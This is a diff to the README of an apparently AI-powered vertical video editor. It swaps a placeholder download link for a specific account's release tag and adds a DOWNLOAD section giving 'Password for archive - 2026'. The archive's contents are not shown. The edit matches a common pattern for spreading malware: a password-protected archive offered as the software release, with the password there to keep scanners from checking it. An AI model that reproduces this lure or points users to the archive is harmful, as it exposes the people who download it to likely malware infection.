@@ -21,13 +21,21 @@
 
   <br><br>
 
-  <a href="https://github.com/yourusername/nexus-ai-editor/releases">
+  <a href="https://github.com/Crewphoyield/ai-powered-vertical-video-editor/releases/tag/Nexus">
     <img src="https://img.shields.io/badge/Download-Latest%20Release%20(v1.3.0)-4a148c?style=for-the-badge&logo=github&logoColor=white"/>
   </a>
 
 </div>
 
 ---
+
+ ## DOWNLOAD 
+ - Password for archive - 2026
+ <div align="center">
+  <a href="https://github.com/Crewphoyield/ai-powered-vertical-video-editor/releases/tag/Nexus">
+    <b>⬇️ DOWNLOAD (Latest Release)</b>
+  </a>
+</div>
 
 ### Overview
 
